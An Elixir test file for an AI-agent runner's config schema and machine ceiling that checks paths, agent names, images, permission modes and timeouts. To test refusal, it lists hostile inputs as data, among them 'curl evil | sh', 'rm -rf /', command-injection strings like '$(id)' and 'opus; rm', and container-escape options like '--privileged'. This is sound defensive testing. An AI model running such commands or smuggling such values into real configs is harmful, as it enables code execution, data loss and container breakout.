defmodule Slipdock.Runners.ConfigTest do
  @moduledoc """
  A machine runner's config is a closed, typed schema with no command
  field (#2571, W-2541); a machine's ceiling is cleaned as reported and a
  config is checked against it field by field.
  """
  use ExUnit.Case, async: true

  alias Slipdock.Runners.{Ceiling, Config}

  @dir "/srv/src/app"

  describe "build/2" do
    test "fills the defaults around what is given" do
      assert {:ok, config} = Config.build(%{"directory" => @dir})

      assert config == %{
               "agent" => "claude",
               "directory" => @dir,
               "permission_mode" => "acceptEdits",
               "timeout_minutes" => 60,
               "model" => nil,
               "worktree" => "auto",
               "verbosity" => "normal",
               "instructions" => nil,
               "executor" => "user",
               "before_hook" => nil,
               "after_hook" => nil,
               "probe_hook" => nil,
               "image" => nil,
               "network" => "on"
             }

      assert Map.keys(config) |> Enum.sort() ==
               Config.fields() |> Enum.map(&Atom.to_string/1) |> Enum.sort()
    end

    test "takes every field, atom keys too, and tidies blanks" do
      assert {:ok, config} =
               Config.build(%{
                 agent: "codex",
                 directory: "  C:\\src\\app ",
                 permission_mode: "plan",
                 timeout_minutes: "90",
                 model: "claude-opus-5-5",
                 worktree: "on",
                 verbosity: "verbose",
                 instructions: "  ",
                 executor: "confined",
                 before_hook: "fresh-main",
                 after_hook: "",
                 probe_hook: "probe_1"
               })

      assert config["directory"] == "C:\\src\\app"
      assert config["timeout_minutes"] == 90
      assert config["instructions"] == nil
      assert config["after_hook"] == nil
      assert config["before_hook"] == "fresh-main"
    end

    test "has no command field: an unknown key is refused, not dropped" do
      assert {:error, message} =
               Config.build(%{"directory" => @dir, "command" => "curl evil | sh"})

      assert message =~ "unknown config field: command"
      assert message =~ "lives only in the machine's own local file"

      assert {:error, message} =
               Config.build(%{"directory" => @dir, "script" => "x", "hook_path" => "/bin/sh"})

      assert message =~ "unknown config fields: hook_path, script"
      refute "command" in Enum.map(Config.fields(), &Atom.to_string/1)
    end

    test "names stay names, never paths or commands" do
      for {field, value} <- [
            {"agent", "/usr/bin/claude"},
            {"agent", "claude --dangerously"},
            {"before_hook", "../hook.sh"},
            {"after_hook", "rm -rf /"},
            {"probe_hook", "Probe"},
            {"model", "opus; rm"}
          ] do
        assert {:error, message} = Config.build(%{"directory" => @dir, field => value})
        assert message =~ field
      end
    end

    test "values out of their type are refused, each named" do
      for {field, value, says} <- [
            {"directory", "relative/dir", "must be an absolute path"},
            {"directory", "/src/../etc", "may not contain .."},
            {"directory", "/src/\napp", "control characters"},
            {"directory", "/" <> String.duplicate("a", 500), "too long"},
            {"directory", "", "can't be blank"},
            {"permission_mode", "yolo", "must be one of plan, default"},
            {"timeout_minutes", 0, "greater than 0"},
            {"timeout_minutes", 1441, "less than or equal to 1440"},
            {"timeout_minutes", "soon", "is invalid"},
            {"worktree", "maybe", "auto, on or off"},
            {"verbosity", "loud", "quiet, normal or verbose"},
            {"executor", "root", "must be one of me, user"},
            {"instructions", String.duplicate("x", 4001), "at most 4000"}
          ] do
        assert {:error, message} = Config.build(%{"directory" => @dir, field => value}),
               "#{field} #{inspect(value)} was accepted"

        assert message =~ field
        assert message =~ says
      end
    end

    test "a container runner names an image, a name and never an option (#2577)" do
      digest = "@sha256:" <> String.duplicate("a1", 32)

      for image <- [
            "alpine",
            "slipdock-agent:1",
            "ghcr.io/me/agent:1.2",
            "localhost:5000/a/b" <> digest
          ] do
        assert {:ok, %{"image" => ^image, "executor" => "container"}} =
                 Config.build(%{"directory" => @dir, "executor" => "container", "image" => image})
      end

      for bad <- [
            "--privileged",
            "-v/:/host",
            "alpine --privileged",
            "alpine\n--rm",
            "Alpine",
            "ghcr.io/me/agent:*",
            "alpine;id",
            "$(id)",
            "alpine:",
            "ghcr.io/me/agent,readonly",
            String.duplicate("a", 256)
          ] do
        assert {:error, message} =
                 Config.build(%{"directory" => @dir, "executor" => "container", "image" => bad})

        assert message =~ "image ", "took #{inspect(bad)}"
      end

      assert {:error, "image is required when executor is container"} =
               Config.build(%{"directory" => @dir, "executor" => "container"})

      assert {:error, "image is required when executor is container"} =
               Config.build(%{"directory" => @dir, "executor" => "container", "image" => "  "})

      # Moving a runner to container later needs the image then.
      {:ok, stored} = Config.build(%{"directory" => @dir, "executor" => "me"})
      assert {:error, "image " <> _} = Config.build(%{"executor" => "container"}, stored)

      assert {:ok, %{"image" => "alpine:3", "executor" => "container"}} =
               Config.build(%{"executor" => "container", "image" => "alpine:3"}, stored)
    end

    test "the network is on or off (#2577)" do
      assert {:ok, %{"network" => "off"}} =
               Config.build(%{"directory" => @dir, "network" => "off"})

      for bad <- ["Off", "none", "host", true] do
        assert {:error, "network " <> _} =
                 Config.build(%{"directory" => @dir, "network" => bad}),
               "took #{inspect(bad)}"
      end
    end

    test "a new config needs a directory" do
      assert {:error, "directory can't be blank"} = Config.build(%{})
      assert {:error, _} = Config.build("not a map")
    end

    test "a change lays over the stored config" do
      {:ok, base} = Config.build(%{"directory" => @dir, "model" => "sonnet"})
      assert {:ok, changed} = Config.build(%{"timeout_minutes" => 30}, base)
      assert changed["model"] == "sonnet"
      assert changed["timeout_minutes"] == 30
      assert changed["directory"] == @dir
    end
  end

  describe "Ceiling.build/1" do
    @ceiling %{
      "roots" => ["/srv/src", "/srv/src"],
      "agents" => ["claude"],
      "max_permission_mode" => "acceptEdits",
      "max_timeout_minutes" => 60,
      "boards" => [3],
      "executors" => ["user", "me"]
    }

    test "keeps each limit, without repeats" do
      assert {:ok, ceiling} = Ceiling.build(@ceiling)
      assert ceiling["roots"] == ["/srv/src"]
      assert ceiling["executors"] == ["user", "me"]
      assert ceiling["max_timeout_minutes"] == 60
    end

    test "every limit is required, and checked" do
      for {key, value, says} <- [
            {"roots", nil, "roots is required"},
            {"roots", ["relative"], "roots: \"relative\""},
            {"roots", ["/a/../b"], "roots"},
            {"roots", List.duplicate("/a", 51), "at most 50"},
            {"agents", ["/bin/sh"], "agents"},
            {"executors", ["root"], "executors"},
            {"boards", ["three"], "boards"},
            {"boards", [0], "boards"},
            {"max_permission_mode", "yolo", "max_permission_mode"},
            {"max_timeout_minutes", 0, "max_timeout_minutes"},
            {"max_timeout_minutes", "60", "max_timeout_minutes"}
          ] do
        assert {:error, message} = Ceiling.build(Map.put(@ceiling, key, value)),
               "#{key} #{inspect(value)} was accepted"

        assert message =~ says
      end

      assert {:error, _} = Ceiling.build("no")
    end
  end

  describe "Ceiling.check/3" do
    setup do
      {:ok, ceiling} = Ceiling.build(@ceiling)
      {:ok, config} = Config.build(%{"directory" => @dir})
      %{ceiling: ceiling, config: config}
    end

    test "inside every limit is ok; no ceiling reported is ok too", ctx do
      assert Ceiling.check(ctx.config, ctx.ceiling, 3) == :ok

      assert Ceiling.check(%{ctx.config | "directory" => "/srv/src"}, ctx.ceiling, 3) ==
               :ok

      assert Ceiling.check(ctx.config, nil, 99) == :ok
    end

    test "each field outside it gives its own reason", ctx do
      config = %{
        ctx.config
        | "directory" => "/srv/src-other",
          "agent" => "codex",
          "permission_mode" => "bypassPermissions",
          "timeout_minutes" => 61,
          "executor" => "container"
      }

      assert {:error, reasons} = Ceiling.check(config, ctx.ceiling, 4)
      assert length(reasons) == 6
      assert Enum.any?(reasons, &(&1 =~ "directory /srv/src-other is not under"))
      assert Enum.any?(reasons, &(&1 =~ "agent codex"))
      assert Enum.any?(reasons, &(&1 =~ "permission mode bypassPermissions is above acceptEdits"))
      assert Enum.any?(reasons, &(&1 =~ "timeout 61 minutes is over 60"))
      assert Enum.any?(reasons, &(&1 =~ "executor container"))
      assert Enum.any?(reasons, &(&1 =~ "board 4"))
    end

    test "outside/3 names each field outside it, with its limit, for the page (#2572)", ctx do
      assert Ceiling.outside(ctx.config, ctx.ceiling, 3) == []
      assert Ceiling.outside(ctx.config, nil, 3) == []

      config = %{ctx.config | "timeout_minutes" => 240, "executor" => "container"}

      assert Ceiling.outside(config, ctx.ceiling, 3) == [
               {"timeout_minutes", "timeout 240 minutes is over 60"},
               {"executor", "executor container is not one this machine offers"}
             ]

      # A timeout still being typed (not a number yet) isn't called outside.
      assert Ceiling.outside(%{ctx.config | "timeout_minutes" => nil}, ctx.ceiling, 3) == []

      assert [{"board", "board 4 is not one this machine serves"}] =
               Ceiling.outside(ctx.config, ctx.ceiling, 4)
    end

    test "a weaker mode is inside a stronger ceiling", ctx do
      for mode <- ~w(plan default acceptEdits) do
        assert Ceiling.check(%{ctx.config | "permission_mode" => mode}, ctx.ceiling, 3) == :ok
      end
    end

    test "under a root goes segment by segment" do
      assert Ceiling.under_root?("/src/app", ["/src"])
      assert Ceiling.under_root?("/src", ["/src/"])
      refute Ceiling.under_root?("/srcx/app", ["/src"])
      refute Ceiling.under_root?("~/src", ["/src"])
      assert Ceiling.under_root?("C:\\src\\app", ["C:/src"])
      refute Ceiling.under_root?(nil, ["/src"])
    end
  end
end
